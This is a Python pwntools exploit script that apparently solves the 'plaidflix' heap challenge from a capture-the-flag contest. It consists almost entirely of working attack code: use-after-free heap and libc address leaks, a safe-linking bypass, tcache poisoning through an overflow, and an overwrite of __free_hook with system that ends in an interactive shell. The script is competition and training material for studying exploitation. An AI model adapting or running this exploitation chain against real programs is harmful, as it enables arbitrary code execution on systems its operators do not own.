#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'plaidflix.pwni.ng', 1337 
binary = './plaidmod'
brkpts = '''
'''

elf = ELF("plaidmod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def add_movie(title):
	sla("> ","0")
	sla("> ","0")
	sla("> ",title)
	sla("> ","1")

def delete_movie(idx):
	sla("> ","0")
	sla("> ","1")
	sla("> ",str(idx))

def show_movie():
	sla("> ","0")
	sla("> ","2")

def share_movie(movie_idx,friend_idx):
	sla("> ","0")
	sla("> ","3")
	sla("> ",str(movie_idx))
	sla("> ",str(friend_idx))

def add_friend(name,size):
	sla("> ","1")
	sla("> ","0")
	sla("> ",str(size))
	sla("> ",name)

def delete_friend(idx):
	sla("> ","1")
	sla("> ","1")
	sla("> ",str(idx))

def show_friend():
	sla("> ","1")
	sla("> ","2")

def delete_acc():
	sla("> ","2")
	sla("> ","y")

def add_feedback(data):
	sla("> ","0")
	sla("> ",data)

def remove_feedback(idx):
	sla("> ","1")
	sla("> ",str(idx))

def contact(data):
	sla("> ","2")
	sla("> ",data)

if __name__== "__main__":

	name = "a"*0x10
	sla("> ",name)

	add_movie("a1")
	add_movie("a2")
	for i in range(8):
		add_friend("A"*7+str(i),0x40)

	share_movie(0,0)
	share_movie(1,1)

	for i in range(7,-1,-1):
		delete_friend(i)

	show_movie()

	ru("Shared with: ")
	heap1 = uu64(rl().replace(b"\n",b""))
	heap1 = hex(heap1)
	#log.info("leak @ "+heap1)

	ru("Shared with: ")
	heap2 = uu64(rl().replace(b"\n",b""))
	heap2 = hex(heap2)
	#log.info("leak @ "+ heap2)

	val = int(heap1[-3::],16) ^ int(heap2[-3::],16)
	val = hex(val)
	final = heap1+val[2::]
	
	heap_base = int(final,16)-0x460
	log.info("heap @ "+hex(heap_base))

	for i in range(8):
		add_friend("abc"+str(i),0x80-1)

	share_movie(0,0)

	for i in range(7,-1,-1):
		delete_friend(i)

	add_friend("abc",0x90-1)
	
	show_movie()

	ru("Shared with: ")
	leak = uu64(rl().replace(b"\n",b""))
	
	libc.address = leak - 0x1e3c80
	log.info("libc @ "+ hex(libc.address) )

	free_hook = libc.symbols['__free_hook']
	system = libc.symbols['system']

	delete_acc()
	
	for i in range(10):
		add_feedback("abc"+str(i))

	for i in range(9):
		remove_feedback(i)

	add_feedback("/bin/sh\x00")
	add_feedback("abc")

	remove_feedback(8)
    
	gdb.attach(io)
    
	contact("a"*0x108 + p64(0x111) + p64(0)*2)
	remove_feedback(8)

	addr = ((heap_base + 0x11a0) >> 12) ^ free_hook
	add_feedback(p64(addr))

	add_feedback("a")

	add_feedback(p64(system))

	remove_feedback(0)

	io.interactive()
